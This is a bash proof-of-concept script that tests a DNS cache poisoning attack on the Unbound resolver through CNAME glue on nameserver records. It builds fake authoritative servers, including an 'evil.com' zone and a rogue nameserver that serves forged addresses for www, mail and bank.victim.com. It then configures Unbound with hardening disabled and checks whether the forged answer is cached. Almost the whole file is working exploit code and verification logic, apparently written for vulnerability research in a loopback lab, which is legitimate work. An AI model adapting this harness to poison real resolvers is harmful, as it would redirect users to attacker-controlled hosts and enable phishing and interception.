#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  NS→CNAME Cache Poisoning PoC v3
#  使用 stub-zone 代替 root hints，避免 priming 问题
# ═══════════════════════════════════════════════════════════════════
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/unbound-cache-poison-test-v3"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

kill_all() {
  pkill -f "python3.*auth_\|python3.*fake_" 2>/dev/null || true
  pkill -f "unbound.*5353" 2>/dev/null || true
  sleep 1
}
kill_all

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME Cache Poisoning PoC v3                            ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# Add loopback IPs
ip addr add 127.0.0.2/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.3/8 dev lo 2>/dev/null || true

# ═══════════════════════════════════════════════════════════════════
# Auth server for com + victim.com + safe.com on 127.0.0.2:53
# This server returns REFERRALS for delegated names
# ═══════════════════════════════════════════════════════════════════
cat > "$VDIR/auth_com.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Auth server on 127.0.0.2:53
Serves: com zone (with delegations), victim.com zone, safe.com zone

Key behavior:
- For queries in delegated sub-zones (victim.com, evil.com, safe.com):
  Returns REFERRALS (AA=0, authority + additional sections)
- For queries in the com zone itself:
  Returns AUTHORITATIVE answers (AA=1, answer section)
- For queries in victim.com/safe.com zones:
  Returns AUTHORITATIVE answers (these zones are hosted here too)
  
BUT: for victim.com, we do NOT include www.victim.com in this server.
We only include the CNAME for ns.victim.com so Unbound can resolve it.
The actual www.victim.com query should go to the fake NS (127.0.0.1).
"""
import socket, struct, time, json, os, sys

LOG = "/workspace/output/unbound-cache-poison-test-v3/com_queries.jsonl"

def enc(name):
    if not name or name == '.':
        return b'\x00'
    r = b''
    for label in name.rstrip('.').split('.'):
        if label:
            r += bytes([len(label)]) + label.encode('ascii')
    r += b'\x00'
    return r

def enc_rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip, rtype):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip, 'resp': rtype}) + '\n')
    print(f"[COM]  {from_ip}: {qname} {qtype} → {rtype}", flush=True)

# Delegation info for the com zone
DELEGATIONS = {
    'victim.com': {
        'ns': 'ns.victim.com.',
        'glue': [
            # CNAME glue — this is the key!
            ('ns.victim.com.', 5, 300, enc('resolve.evil.com.')),
        ],
    },
    'evil.com': {
        'ns': 'ns.evil.com.',
        'glue': [
            ('ns.evil.com.', 1, 300, struct.pack('!I', 0x7f000003)),
        ],
    },
    'safe.com': {
        'ns': 'ns.safe.com.',
        'glue': [
            ('ns.safe.com.', 1, 300, struct.pack('!I', 0x7f000002)),
        ],
    },
}

# Authoritative records for com zone
COM_RECORDS = {
    ('com', 6): [(300, enc('ns1.com.') + enc('admin.com.') + struct.pack('!IIIII', 2026100901, 3600, 900, 604800, 86400))],
    ('com', 2): [(300, enc('ns1.com.'))],
    ('ns1.com', 1): [(300, struct.pack('!I', 0x7f000002))],
}

# Authoritative records for victim.com zone (hosted on same server)
# IMPORTANT: We include CNAME for ns.victim.com but NOT www.victim.com A
# The www.victim.com A record should only be served by the fake NS
VICTIM_RECORDS = {
    ('victim.com', 6): [(300, enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400))],
    ('victim.com', 2): [(300, enc('ns.victim.com.'))],
    ('ns.victim.com', 5): [(300, enc('resolve.evil.com.'))],  # CNAME!
}

# Authoritative records for safe.com zone (control)
SAFE_RECORDS = {
    ('safe.com', 6): [(300, enc('ns.safe.com.') + enc('admin.safe.com.') + struct.pack('!IIIII', 2026100905, 3600, 900, 604800, 86400))],
    ('safe.com', 2): [(300, enc('ns.safe.com.'))],
    ('ns.safe.com', 1): [(300, struct.pack('!I', 0x7f000002))],
    ('www.safe.com', 1): [(300, struct.pack('!I', 0x05050505))],
}

# Zone map: suffix → (records, is_delegated)
ZONES = {
    'com': (COM_RECORDS, False),
    'victim.com': (VICTIM_RECORDS, True),   # True = delegated from com
    'safe.com': (SAFE_RECORDS, True),
}

def find_delegation(qname):
    """Check if qname belongs to a delegated zone."""
    qn = qname.lower().rstrip('.')
    for dname, info in DELEGATIONS.items():
        dn = dname.lower().rstrip('.')
        if qn == dn or qn.endswith('.' + dn):
            return dname, info
    return None, None

def find_auth_zone(qname):
    """Find the most specific authoritative zone for qname."""
    qn = qname.lower().rstrip('.')
    # Check child zones first (longest match)
    for zname in ['victim.com', 'safe.com', 'com']:
        zn = zname.lower().rstrip('.')
        if qn == zn or qn.endswith('.' + zn):
            return zname
    return None

def handle_query(data, addr, sock):
    if len(data) < 12: return
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if (flags >> 15) != 0: return

    off = 12
    labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63: off += 2; break  # compression pointer
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else:
        off += 1
    qname = '.'.join(labels)
    if off + 4 > len(data): return
    qt, qc = struct.unpack('!HH', data[off:off+4])

    QTM = {1:'A', 2:'NS', 5:'CNAME', 6:'SOA', 28:'AAAA'}
    qtn = QTM.get(qt, f'T{qt}')

    # 1. Check if this is a query for a delegated name
    dname, dinfo = find_delegation(qname)
    if dinfo and dname != 'evil.com':  # evil.com is NOT hosted here
        # For queries about the delegation point itself (NS/SOA), return auth answer from com zone
        qn = qname.lower().rstrip('.')
        dn = dname.lower().rstrip('.')
        
        # If querying the delegated zone's NS/SOA, return referral from com
        # (unless the delegated zone is also hosted here and the query is specifically for it)
        is_delegated_zone_query = (qn == dn)
        
        if is_delegated_zone_query and qt in (2, 6):
            # For NS/SOA of the delegated zone, return from the child zone
            zone_name = find_auth_zone(qname)
            if zone_name and zone_name in ZONES:
                records, _ = ZONES[zone_name]
                resp = build_auth_answer(txid, qname, qt, qc, records, zone_name)
                log_q(qname, qtn, addr[0], f'AUTH({zone_name})')
                sock.sendto(resp, addr)
                return
        
        # Otherwise, return referral
        resp = build_referral(txid, qname, qt, qc, dname, dinfo)
        log_q(qname, qtn, addr[0], f'REFERRAL→{dname}')
        sock.sendto(resp, addr)
        return

    # 2. Return authoritative answer
    zone_name = find_auth_zone(qname)
    if zone_name and zone_name in ZONES:
        records, _ = ZONES[zone_name]
        resp = build_auth_answer(txid, qname, qt, qc, records, zone_name)
        log_q(qname, qtn, addr[0], f'AUTH({zone_name})')
        sock.sendto(resp, addr)
        return

    # 3. No match — REFUSED
    resp = struct.pack('!HHHHHH', txid, 0x8005, 1, 0, 0, 0)
    resp += enc(qname) + struct.pack('!HH', qt, qc)
    log_q(qname, qtn, addr[0], 'REFUSED')
    sock.sendto(resp, addr)

def build_referral(txid, qname, qtype, qclass, deleg_name, deleg_info):
    """Build referral: AA=0, authority=NS, additional=glue."""
    flags = 0x8000  # QR=1, AA=0
    ns_name = deleg_info['ns']
    glue = deleg_info['glue']
    
    hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 1, len(glue))
    q = enc(qname) + struct.pack('!HH', qtype, qclass)
    
    # Authority: deleg_name NS ns_name
    ns_rdata = enc(ns_name)
    auth = enc_rr(deleg_name, 2, qclass, 300, ns_rdata)
    
    # Additional: glue records
    add = b''
    for gname, gtype, gttl, grdata in glue:
        add += enc_rr(gname, gtype, qclass, gttl, grdata)
    
    return hdr + q + auth + add

def build_auth_answer(txid, qname, qtype, qclass, records, zone_name):
    """Build authoritative answer."""
    flags = 0x8400  # QR=1, AA=1
    answers = []
    qn = qname.lower().rstrip('.')

    # Direct type match
    key = (qn, qtype)
    if key in records:
        for ttl, rd in records[key]:
            answers.append((qname, qtype, ttl, rd))

    # CNAME chase
    if qtype != 5 and (qn, 5) in records:
        for ttl, rd in records[(qn, 5)]:
            answers.append((qname, 5, ttl, rd))

    if not answers:
        # NODATA or NXDOMAIN
        soa_key = (zone_name.lower(), 6)
        if soa_key in records:
            soa = records[soa_key][0][1]
            flags = 0x8403  # NXDOMAIN
            hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 1, 0)
            q = enc(qname) + struct.pack('!HH', qtype, qclass)
            auth = enc_rr(zone_name, 6, qclass, 300, soa)
            return hdr + q + auth
        resp = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 0, 0)
        resp += enc(qname) + struct.pack('!HH', qtype, qclass)
        return resp

    hdr = struct.pack('!HHHHHH', txid, flags, 1, len(answers), 0, 0)
    q = enc(qname) + struct.pack('!HH', qtype, qclass)
    a = b''
    for n, t, ttl, rd in answers:
        a += enc_rr(n, t, qclass, ttl, rd)
    return hdr + q + a

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.2', 53))
print("[COM]  Listening on 127.0.0.2:53", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        handle_query(data, addr, sock)
    except Exception as e:
        print(f"[COM]  Error: {e}", flush=True, file=sys.stderr)
PYEOF

# ═══════════════════════════════════════════════════════════════════
# Evil.com auth server on 127.0.0.3:53
# ═══════════════════════════════════════════════════════════════════
cat > "$VDIR/auth_evil.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-test-v3/evil_queries.jsonl"

def enc(name):
    if not name or name == '.': return b'\x00'
    r = b''
    for l in name.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode('ascii')
    return r + b'\x00'

def enc_rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip}) + '\n')
    print(f"[EVIL] {from_ip}: {qname} {qtype}", flush=True)

RECORDS = {
    ('evil.com', 6): [(300, enc('ns.evil.com.') + enc('admin.evil.com.') + struct.pack('!IIIII', 2026100904, 3600, 900, 604800, 86400))],
    ('evil.com', 2): [(300, enc('ns.evil.com.'))],
    ('ns.evil.com', 1): [(300, struct.pack('!I', 0x7f000003))],
    # KEY RECORD: resolve.evil.com A 127.0.0.1 → points to fake NS
    ('resolve.evil.com', 1): [(300, struct.pack('!I', 0x7f000001))],
}

QTM = {1:'A',2:'NS',5:'CNAME',6:'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.3', 53))
print("[EVIL] Listening on 127.0.0.3:53", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12; labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off+1+ll > len(data): break
            if ll > 63: off += 2; break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        else: off += 1
        qname = '.'.join(labels)
        if off+4 > len(data): continue
        qt, qc = struct.unpack('!HH', data[off:off+4])
        qtn = QTM.get(qt, f'T{qt}')
        log_q(qname, qtn, addr[0])
        
        qn = qname.lower().rstrip('.')
        answers = []
        if (qn, qt) in RECORDS:
            for ttl, rd in RECORDS[(qn, qt)]:
                answers.append((qname, qt, ttl, rd))
        if qt != 5 and (qn, 5) in RECORDS:
            for ttl, rd in RECORDS[(qn, 5)]:
                answers.append((qname, 5, ttl, rd))
        
        if answers:
            flags_r = 0x8400
            hdr = struct.pack('!HHHHHH', txid, flags_r, 1, len(answers), 0, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            a = b''
            for n, t, ttl, rd in answers:
                a += enc_rr(n, t, qc, ttl, rd)
            sock.sendto(hdr + q + a, addr)
        else:
            soa = RECORDS.get(('evil.com', 6), [(300, b'')])[0][1]
            flags_r = 0x8403
            hdr = struct.pack('!HHHHHH', txid, flags_r, 1, 0, 1, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            auth = enc_rr('evil.com', 6, qc, 300, soa)
            sock.sendto(hdr + q + auth, addr)
    except Exception as e:
        print(f"[EVIL] Error: {e}", flush=True, file=sys.stderr)
PYEOF

# ═══════════════════════════════════════════════════════════════════
# Fake NS on 127.0.0.1:53
# ═══════════════════════════════════════════════════════════════════
cat > "$VDIR/fake_ns.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Fake NS on 127.0.0.1:53
This server is NOT the legitimate NS for victim.com.
It only receives queries because Unbound followed the NS→CNAME chain.
Returns FORGED records.
"""
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-test-v3/fake_queries.jsonl"

def enc(name):
    if not name or name == '.': return b'\x00'
    r = b''
    for l in name.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode('ascii')
    return r + b'\x00'

def enc_rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip}) + '\n')
    print(f"[FAKE] {from_ip}: {qname} {qtype}  ← ATTACKER RECEIVED QUERY!", flush=True)

FORGED = {
    ('victim.com', 6): [(300, enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 999, 3600, 900, 604800, 86400))],
    ('victim.com', 2): [(300, enc('ns.victim.com.'))],
    ('ns.victim.com', 1): [(300, struct.pack('!I', 0x7f000001))],
    # FORGED: www.victim.com should be 1.2.3.4 (from legitimate auth 127.0.0.2)
    ('www.victim.com', 1): [(300, struct.pack('!I', 0x06060606))],   # FORGED: 6.6.6.6
    ('mail.victim.com', 1): [(300, struct.pack('!I', 0x06060607))],   # FORGED: 6.6.6.7
    ('bank.victim.com', 1): [(300, struct.pack('!I', 0x06060608))],   # FORGED: 6.6.6.8
}

QTM = {1:'A',2:'NS',5:'CNAME',6:'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 53))
print("[FAKE] Listening on 127.0.0.1:53 — will return FORGED records", flush=True)
print("[FAKE]   www.victim.com  A 6.6.6.6  (legit=1.2.3.4)", flush=True)
print("[FAKE]   mail.victim.com A 6.6.6.7  (legit=1.2.3.5)", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12; labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off+1+ll > len(data): break
            if ll > 63: off += 2; break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        else: off += 1
        qname = '.'.join(labels)
        if off+4 > len(data): continue
        qt, qc = struct.unpack('!HH', data[off:off+4])
        qtn = QTM.get(qt, f'T{qt}')
        log_q(qname, qtn, addr[0])
        
        qn = qname.lower().rstrip('.')
        answers = []
        if (qn, qt) in FORGED:
            for ttl, rd in FORGED[(qn, qt)]:
                answers.append((qname, qt, ttl, rd))
        if qt != 5 and (qn, 5) in FORGED:
            for ttl, rd in FORGED[(qn, 5)]:
                answers.append((qname, 5, ttl, rd))
        
        if answers:
            flags_r = 0x8400
            hdr = struct.pack('!HHHHHH', txid, flags_r, 1, len(answers), 0, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            a = b''
            for n, t, ttl, rd in answers:
                a += enc_rr(n, t, qc, ttl, rd)
            sock.sendto(hdr + q + a, addr)
        else:
            soa = FORGED[('victim.com', 6)][0][1]
            hdr = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            auth = enc_rr('victim.com', 6, qc, 300, soa)
            sock.sendto(hdr + q + auth, addr)
    except Exception as e:
        print(f"[FAKE] Error: {e}", flush=True, file=sys.stderr)
PYEOF

# Clear logs and start servers
> "$VDIR/com_queries.jsonl" 2>/dev/null || true
> "$VDIR/evil_queries.jsonl" 2>/dev/null || true
> "$VDIR/fake_queries.jsonl" 2>/dev/null || true

python3 "$VDIR/auth_com.py" > "$VDIR/com.log" 2>&1 &
COM_PID=$!
sleep 0.5

python3 "$VDIR/auth_evil.py" > "$VDIR/evil.log" 2>&1 &
EVIL_PID=$!
sleep 0.5

python3 "$VDIR/fake_ns.py" > "$VDIR/fake.log" 2>&1 &
FAKE_PID=$!
sleep 0.5

echo "  Servers: com=$COM_PID, evil=$EVIL_PID, fake=$FAKE_PID"
for pid in $COM_PID $EVIL_PID $FAKE_PID; do
  if kill -0 "$pid" 2>/dev/null; then echo "  PID $pid: OK"; else echo "  PID $pid: FAILED"; fi
done

# Verify servers
echo ""
echo "  ─── Direct verification ───"
echo "  com→victim.com delegation (should include CNAME glue):"
dig @127.0.0.2 victim.com A +time=3 2>&1 | head -20
echo ""
echo "  ns.victim.com A (should return CNAME + referral):"
dig @127.0.0.2 ns.victim.com A +time=3 2>&1 | head -15
echo ""
echo "  resolve.evil.com A (from attacker zone):"
dig @127.0.0.3 resolve.evil.com A +time=3 +noall +answer 2>&1
echo ""
echo "  www.victim.com A (legitimate from 127.0.0.2 — should be NXDOMAIN since we removed it):"
dig @127.0.0.2 www.victim.com A +time=3 +noall +answer 2>&1
echo ""
echo "  www.victim.com A (FORGED from 127.0.0.1):"
dig @127.0.0.1 www.victim.com A +time=3 +noall +answer 2>&1

# ═══ Unbound with stub zones ═══
echo ""
echo "═══ Starting Unbound (stub-zone based) ═══"

cat > "$VDIR/ub.conf" << 'EOF'
server:
    directory: "/workspace/output/unbound-cache-poison-test-v3"
    pidfile: "/workspace/output/unbound-cache-poison-test-v3/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-cache-poison-test-v3/unbound.log"
    verbosity: 4
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    domain-insecure: "com"
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no
    prefetch-key: no

# Stub zone for com — this is the parent zone that delegates
stub-zone:
    name: "com"
    stub-addr: 127.0.0.2@53
    stub-prime: no

# Stub zone for evil.com — attacker's zone
stub-zone:
    name: "evil.com"
    stub-addr: 127.0.0.3@53
    stub-prime: no

# NO stub zone for victim.com — force Unbound to discover it through com delegation

remote-control:
    control-enable: no
EOF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/unbound_stdout.log" 2>&1 &
UB_PID=$!
sleep 2

if kill -0 "$UB_PID" 2>/dev/null; then
  echo "  Unbound started (PID=$UB_PID)"
else
  echo "  Unbound FAILED:"
  cat "$VDIR/unbound.log" | head -30
  kill_all; exit 1
fi

# ═══ ATTACK TEST ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ATTACK TEST                                                ║"
echo "╚══════════════════════════════════════════════════════════════╝"

python3 << 'PYEOF'
import socket, struct, time, json

def dns_query(name, qtype, port=5353, timeout=20):
    qname = b''
    for label in name.rstrip('.').split('.'):
        qname += bytes([len(label)]) + label.encode()
    qname += b'\x00'
    txid = 0xCAFE
    header = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)
    question = qname + struct.pack('!HH', qtype, 1)
    pkt = header + question
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    start = time.monotonic()
    try:
        sock.sendto(pkt, ('127.0.0.1', port))
        data, _ = sock.recvfrom(4096)
        ms = (time.monotonic() - start) * 1000
        if len(data) >= 12:
            _, rflags, _, ancount = struct.unpack('!HHHH', data[:8])
            rcode = rflags & 0xF
            rc_map = {0:'NOERROR',1:'FORMERR',2:'SERVFAIL',3:'NXDOMAIN',4:'NOTIMP',5:'REFUSED'}
            ips = parse_ips(data)
            cnames = parse_cnames(data)
            return rc_map.get(rcode, f'RC{rcode}'), ms, ancount, ips, cnames
        return 'ERR', ms, 0, [], []
    except socket.timeout:
        return 'TIMEOUT', (time.monotonic() - start) * 1000, 0, [], []
    finally:
        sock.close()

def parse_ips(data):
    if len(data) < 12: return []
    _, _, qdcount, ancount = struct.unpack('!HHHH', data[4:12])
    off = 12
    for _ in range(qdcount):
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0: off += 2; break
            off += 1 + data[off]
        else: off += 1
        off += 4
    ips = []
    for _ in range(ancount):
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0: off += 2; break
            off += 1 + data[off]
        else: off += 1
        if off + 10 > len(data): break
        rtype, rclass, ttl, rdlen = struct.unpack('!HHIH', data[off:off+10])
        off += 10
        if off + rdlen > len(data): break
        if rtype == 1 and rdlen == 4:
            ip = '.'.join(str(b) for b in data[off:off+4])
            ips.append(ip)
        off += rdlen
    return ips

def parse_cnames(data):
    if len(data) < 12: return []
    _, _, qdcount, ancount = struct.unpack('!HHHH', data[4:12])
    off = 12
    for _ in range(qdcount):
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0: off += 2; break
            off += 1 + data[off]
        else: off += 1
        off += 4
    cnames = []
    for _ in range(ancount):
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0: off += 2; break
            off += 1 + data[off]
        else: off += 1
        if off + 10 > len(data): break
        rtype, rclass, ttl, rdlen = struct.unpack('!HHIH', data[off:off+10])
        off += 10
        if off + rdlen > len(data): break
        if rtype == 5:  # CNAME
            # Parse CNAME target (handle compression)
            target = parse_name(data, off)
            cnames.append(target)
        off += rdlen
    return cnames

def parse_name(data, off):
    labels = []
    while off < len(data):
        if data[off] == 0:
            break
        if data[off] & 0xC0 == 0xC0:
            ptr = struct.unpack('!H', data[off:off+2])[0] & 0x3FFF
            rest = parse_name(data, ptr)
            labels.append(rest)
            break
        ll = data[off]
        off += 1
        labels.append(data[off:off+ll].decode('ascii', errors='replace'))
        off += ll
    return '.'.join(labels)

QT_A = 1

# ═══ Phase 1: Resolve victim.com NS ═══
print("  ═══ Phase 1: Discover victim.com delegation ═══")
rcode, ms, ans, ips, cnames = dns_query("victim.com", 2, timeout=15)  # NS query
print(f"  victim.com NS: {rcode} {ms:.1f}ms answers={ans} IPs={ips} CNAMEs={cnames}")
time.sleep(1)

# ═══ Phase 2: Resolve NS address through CNAME ═══
print()
print("  ═══ Phase 2: Resolve NS address (ns.victim.com → CNAME → evil.com → IP) ═══")
rcode, ms, ans, ips, cnames = dns_query("ns.victim.com", QT_A, timeout=15)
print(f"  ns.victim.com A: {rcode} {ms:.1f}ms answers={ans} IPs={ips} CNAMEs={cnames}")
time.sleep(1)

# ═══ Phase 3: The attack — query www.victim.com ═══
print()
print("  ═══ Phase 3: Query www.victim.com (should go to fake NS if CNAME was followed) ═══")
print("  Expected legitimate: 1.2.3.4 (from 127.0.0.2)")
print("  Expected forged:     6.6.6.6 (from 127.0.0.1 fake NS)")
print()
rcode, ms, ans, ips, cnames = dns_query("www.victim.com", QT_A, timeout=20)
print(f"  www.victim.com A: {rcode} {ms:.1f}ms answers={ans} IPs={ips} CNAMEs={cnames}")

POISONED = '6.6.6.6' in ips
if POISONED:
    print()
    print("  ╔══════════════════════════════════════════════════════════════╗")
    print("  ║  ⚠⚠⚠ CACHE POISONING PROVED! ⚠⚠⚠                          ║")
    print("  ║  Unbound returned FORGED 6.6.6.6 instead of 1.2.3.4       ║")
    print("  ╚══════════════════════════════════════════════════════════════╝")
elif '1.2.3.4' in ips:
    print("  ✗ No poisoning — legitimate answer returned (CNAME not followed for NS)")
elif rcode == 'SERVFAIL':
    print("  SERVFAIL — check Unbound/server logs")
elif rcode == 'NXDOMAIN':
    print("  NXDOMAIN — the com server didn't serve www.victim.com, and fake NS wasn't queried")
else:
    print(f"  Result: {rcode}, IPs={ips}")

# ═══ Phase 4: Control — safe.com ═══
time.sleep(1)
print()
print("  ═══ Phase 4: Control — safe.com (NS has direct A, no CNAME) ═══")
rcode, ms, ans, ips, cnames = dns_query("www.safe.com", QT_A, timeout=15)
print(f"  www.safe.com A: {rcode} {ms:.1f}ms IPs={ips}")
if '5.5.5.5' in ips:
    print("  ✓ Correct: legitimate 5.5.5.5 (no CNAME, no attack possible)")
elif rcode == 'SERVFAIL':
    print("  SERVFAIL — delegation issue")

# Save result
result = {
    'poisoned': POISONED,
    'www_victim_ips': ips,
    'www_victim_cnames': cnames,
    'rcode': rcode if not POISONED else 'POISONED',
}
with open('/workspace/output/unbound-cache-poison-test-v3/result.json', 'w') as f:
    json.dump(result, f, indent=2)

PYEOF

# ═══ Server log analysis ═══
echo ""
echo "═══ Server log analysis ═══"

echo ""
echo "  ─── Com auth (127.0.0.2) queries ───"
cat "$VDIR/com_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
qs = [json.loads(l) for l in sys.stdin if l.strip()]
print(f'  Total: {len(qs)}')
for q in qs:
    print(f\"    {q['qname']:<30} {q['qtype']:<8} → {q['resp']}\")" 2>/dev/null || echo "  (none)"

echo ""
echo "  ─── Evil auth (127.0.0.3) queries ───"
cat "$VDIR/evil_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
qs = [json.loads(l) for l in sys.stdin if l.strip()]
print(f'  Total: {len(qs)}')
for q in qs:
    print(f\"    {q['qname']:<30} {q['qtype']:<8}\")" 2>/dev/null || echo "  (none)"

echo ""
echo "  ─── Fake NS (127.0.0.1) queries ───"
FAKE_N=$(wc -l < "$VDIR/fake_queries.jsonl" 2>/dev/null || echo 0)
echo "  Total: $FAKE_N"
cat "$VDIR/fake_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    if line.strip():
        q = json.loads(line)
        print(f\"    {q['qname']:<30} {q['qtype']:<8} ← UNAUTHORIZED!\")" 2>/dev/null || true

if [ "$FAKE_N" -gt 0 ] 2>/dev/null; then
  echo ""
  echo "  ⚠ Unbound sent queries to the FAKE NS (127.0.0.1)!"
  echo "  This PROVES the CNAME-resolved IP was used as victim.com's NS address."
fi

# ═══ Unbound log ═══
echo ""
echo "═══ Unbound resolution trace ═══"
grep -i "victim\|evil\|cname\|resolve\|target\|processQuery\|sending to\|deleg" "$VDIR/unbound.log" 2>/dev/null | head -50 || echo "  (none)"

echo ""
echo "═══ SERVFAIL entries ═══"
grep -i "servfail\|fail\|error\|exceed" "$VDIR/unbound.log" 2>/dev/null | head -15 || echo "  (none)"

# Result
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Result                                                      ║"
echo "╚══════════════════════════════════════════════════════════════╝"
cat "$VDIR/result.json" 2>/dev/null || echo "  (no result)"

kill_all
kill "$COM_PID" "$EVIL_PID" "$FAKE_PID" 2>/dev/null || true
echo ""
echo "=== Test Complete ==="
